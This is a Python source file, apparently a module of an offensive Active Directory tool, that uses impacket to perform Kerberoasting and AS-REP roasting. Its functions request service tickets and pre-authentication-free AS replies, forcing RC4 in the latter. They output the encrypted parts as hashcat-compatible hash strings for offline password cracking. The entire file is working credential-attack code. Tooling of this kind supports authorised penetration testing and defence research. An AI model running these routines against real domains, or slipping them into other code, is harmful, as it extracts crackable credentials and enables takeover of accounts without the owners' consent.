import datetime
import logging

from impacket.krb5 import constants as krb_constants
from impacket.krb5.asn1 import AS_REQ, AS_REP, TGS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT, sendReceive
from impacket.krb5.kerberosv5 import constants as krb5_constants
from impacket.krb5.types import Principal
from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue

KRB5_ERROR_MESSAGES = krb5_constants.ERROR_MESSAGES
if 77 not in KRB5_ERROR_MESSAGES:
    KRB5_ERROR_MESSAGES.update(
        {
            77: (
                "KDC_ERR_INCONSISTENT_KEY_PURPOSE",
                "Certificate cannot be used for PKINIT client authentication",
            ),
            78: (
                "KDC_ERR_DIGEST_IN_CERT_NOT_ACCEPTED",
                "Digest algorithm for the public key in the certificate is not acceptable by the KDC",
            ),
            79: (
                "KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED",
                "The paChecksum filed in the request is not present",
            ),
            80: (
                "KDC_ERR_DIGEST_IN_SIGNED_DATA_NOT_ACCEPTED",
                "The digest algorithm used by the id-pkinit-authData is not acceptable by the KDC",
            ),
            81: (
                "KDC_ERR_PUBLIC_KEY_ENCRYPTION_NOT_SUPPORTED",
                "The KDC does not support the public key encryption key delivery method",
            ),
            90: (
                "KDC_ERR_PREAUTH_EXPIRED",
                "The conversation is too old and needs to restart",
            ),
            91: (
                "KDC_ERR_MORE_PREAUTH_DATA_REQUIRED",
                "Additional pre-authentication required",
            ),
            92: (
                "KDC_ERR_PREAUTH_BAD_AUTHENTICATION_SET",
                "KDC cannot accommodate requested padata element",
            ),
            93: ("KDC_ERR_UNKNOWN_CRITICAL_FAST_OPTIONS", "Unknown critical option"),
        }
    )


def _get_tgt(conn):
    """Get a TGT using the connection's credentials."""
    userName = Principal(conn.ldap_user, type=krb_constants.PrincipalNameType.NT_PRINCIPAL.value)
    return getKerberosTGT(
        clientName=userName, password=conn.ldap_pass or '',
        domain=conn.domain, lmhash=conn.lmhash or '',
        nthash=conn.nthash or '', aesKey=conn.aesKey or '',
        kdcHost=conn.target,
    )


def _format_tgs_hash(sam, domain, spn, enc_type, cipher_text):
    """Format a TGS ticket as a hashcat-compatible string."""
    if enc_type == krb_constants.EncryptionTypes.rc4_hmac.value:
        return f'$krb5tgs$23$*{sam}${domain}*${spn}${cipher_text[:16].hex()}${cipher_text[16:].hex()}'
    elif enc_type == krb_constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
        return f'$krb5tgs$18${sam}${domain}$*{spn}*${cipher_text[-12:].hex()}${cipher_text[:-12].hex()}'
    elif enc_type == krb_constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
        return f'$krb5tgs$17${sam}${domain}$*{spn}*${cipher_text[-12:].hex()}${cipher_text[:-12].hex()}'
    return f'Encryption type {enc_type} - raw: {cipher_text.hex()}'


def kerberoast_account(conn, sam, spn, tgt_data=None):
    """Roast a single account and return the hashcat-compatible hash string.

    Args:
        conn: LDAPConnection with valid credentials
        sam: sAMAccountName of the target
        spn: servicePrincipalName to request
        tgt_data: Optional (tgt, cipher, _, sessionKey) tuple to reuse a TGT

    Returns:
        str: hashcat-compatible hash string
    """
    if tgt_data is None:
        tgt_data = _get_tgt(conn)

    tgt, cipher, _, sessionKey = tgt_data
    domain = conn.domain

    serverName = Principal(spn, type=krb_constants.PrincipalNameType.NT_SRV_INST.value)
    tgs, _, _, _ = getKerberosTGS(serverName, domain, conn.target, tgt, cipher, sessionKey)

    tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    enc_type = tgs_rep['ticket']['enc-part']['etype']
    cipher_text = tgs_rep['ticket']['enc-part']['cipher'].asOctets()

    return _format_tgs_hash(sam, domain, spn, enc_type, cipher_text)


def asreproast_account(conn, target):
    """Roast a single account without pre-auth and return the hashcat-compatible hash string.

    Args:
        conn: LDAPConnection (only domain/target are used)
        target: sAMAccountName of the target

    Returns:
        str: hashcat-compatible hash string
    """
    domain = conn.domain.upper()

    clientName = Principal(target, type=krb_constants.PrincipalNameType.NT_PRINCIPAL.value)
    serverName = Principal(f'krbtgt/{domain}', type=krb_constants.PrincipalNameType.NT_SRV_INST.value)

    as_req = AS_REQ()
    as_req['pvno'] = 5
    as_req['msg-type'] = int(krb_constants.ApplicationTagNumbers.AS_REQ.value)

    reqBody = seq_set(as_req, 'req-body')
    opts = [
        krb_constants.KDCOptions.forwardable.value,
        krb_constants.KDCOptions.renewable.value,
        krb_constants.KDCOptions.proxiable.value,
    ]
    reqBody['kdc-options'] = krb_constants.encodeFlags(opts)

    seq_set(reqBody, 'sname', serverName.components_to_asn1)
    seq_set(reqBody, 'cname', clientName.components_to_asn1)
    reqBody['realm'] = domain

    now = datetime.datetime.now(datetime.timezone.utc)
    reqBody['till'] = noValue
    reqBody['till'] = (now + datetime.timedelta(days=1)).strftime("%Y%m%d%H%M%SZ")
    reqBody['rtime'] = noValue
    reqBody['rtime'] = (now + datetime.timedelta(days=1)).strftime("%Y%m%d%H%M%SZ")
    reqBody['nonce'] = 0

    supported_ciphers = (int(krb_constants.EncryptionTypes.rc4_hmac.value),)
    seq_set_iter(reqBody, 'etype', supported_ciphers)

    message = encoder.encode(as_req)
    r = sendReceive(message, domain, conn.target)

    as_rep = decoder.decode(r, asn1Spec=AS_REP())[0]
    cipher_text = as_rep['enc-part']['cipher'].asOctets()

    return f'$krb5asrep$23${target}@{domain}:{cipher_text[:16].hex()}${cipher_text[16:].hex()}'